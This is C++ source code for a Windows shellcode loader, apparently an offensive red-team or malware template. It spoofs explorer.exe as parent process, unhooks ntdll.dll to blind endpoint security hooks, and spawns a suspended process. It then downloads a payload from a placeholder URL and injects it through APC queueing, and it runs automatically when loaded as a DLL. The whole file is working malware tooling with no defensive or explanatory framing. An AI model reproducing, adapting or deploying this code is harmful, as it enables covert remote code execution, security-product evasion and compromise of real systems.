
#define _WIN32_WINNT 0x0600
#include <iostream>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "Wininet.lib")
#include <psapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include "Syscalls2.h"
#ifndef UNICODE
typedef std::string String;
#else
typedef std::wstring String;
#endif

#define size 1024 * 1024
unsigned char Buffer[size];

unsigned int Buffer_len = sizeof(Buffer);

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

HANDLE GetParentHandle(LPCSTR parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                {
                    NtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    NtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent)
{
    STARTUPINFOEXA si = {0};
    PROCESS_INFORMATION pi = {0};
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if (!CreateProcessA(NULL, process, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi))
    {
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    return pi;
}

static int Unhook()
{
    HANDLE pollutedNtdll;
    HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID hMapping;

    // get handle of pollutted ntdll.dll

    LPCSTR Ntdll = "ntdll.dll";
    pollutedNtdll = GetModuleHandleA(Ntdll);

    LPCSTR NtdllPath = "c:\\windows\\system32\\ntdll.dll";

    // open fresh copy of ntdll.dll and map a view of it

    hFile = CreateFileA(NtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return -1;
    }

    hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping)
    {
        CloseHandle(hFile);
        return -1;
    }

    hMapping = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!hMapping)
    {
        CloseHandle(hFile);
        CloseHandle(hFileMapping);
        return -1;
    }

    // find .text section of ntdll

    IMAGE_DOS_HEADER *hImgDosHeader = (IMAGE_DOS_HEADER *)hMapping;
    IMAGE_NT_HEADERS *hImgNtHeaders = (IMAGE_NT_HEADERS *)((DWORD_PTR)hMapping + hImgDosHeader->e_lfanew);
    IMAGE_FILE_HEADER hImgFileHeader = (IMAGE_FILE_HEADER)(hImgNtHeaders->FileHeader);
    IMAGE_SECTION_HEADER *hImgSecHeader = (IMAGE_SECTION_HEADER *)((size_t)hImgNtHeaders + sizeof(*hImgNtHeaders));
    DWORD oldprotect = 0;

    for (int i = 0; i < hImgFileHeader.NumberOfSections; i++)
    {
        if (!strcmp((char *)hImgSecHeader[i].Name, ".text"))
        {
            VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
                           hImgSecHeader->Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE,
                           &oldprotect);
            if (!oldprotect)
            {
                return -1;
            }
            memcpy((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
                   (LPVOID)((DWORD_PTR)hMapping + (DWORD_PTR)hImgSecHeader->VirtualAddress),
                   hImgSecHeader->Misc.VirtualSize);
            VirtualProtect((LPVOID)((DWORD_PTR)pollutedNtdll + (DWORD_PTR)hImgSecHeader->VirtualAddress),
                           hImgSecHeader->Misc.VirtualSize,
                           oldprotect,
                           &oldprotect);
            if (!oldprotect)
            {
                return -1;
            }
            return 0;
        }
    }
    return -1;
}

int main()
{

    NTSTATUS res = -1;

    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    HANDLE thandle = NULL;
    SIZE_T bytesWritten;
    if (res == 0)
    {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;
    if (!Unhook())
    {
        std::cout << "ntdll unhooked!" << std::endl;
    }
    PROCESS_INFORMATION pi = SpawnProc((LPSTR) "explorer.exe", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    char *url = (char *)"URLREPLACE";
    DWORD bytes_read;
    HINTERNET internet = InternetOpen("HTTP Downloader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
    HINTERNET file_handle = InternetOpenUrl(internet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!(file_handle == NULL))
    {
        BOOL b = InternetReadFile(file_handle, Buffer, Buffer_len, &bytes_read);
        res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&Buffer_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        res = NtWriteVirtualMemory(hProcess, base_addr, Buffer, Buffer_len, &bytesWritten);
        res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&Buffer_len, PAGE_EXECUTE_READ, &oldprotect);
        res = NtQueueApcThread(hThread, base_addr, NULL, NULL, NULL);
        res = NtAlertResumeThread(hThread, NULL);
        NtClose(hProcess);
        NtClose(hThread);
    }
    return 0;
}

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{ // HANDLE threadhandle;
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		main();
		// threadhandle = CreateThread(NULL, 0, main, NULL, 0, NULL);
		// CloseHandle(threadhandle);
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
// x86_64-w64-mingw32-g++ APC_Injection.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows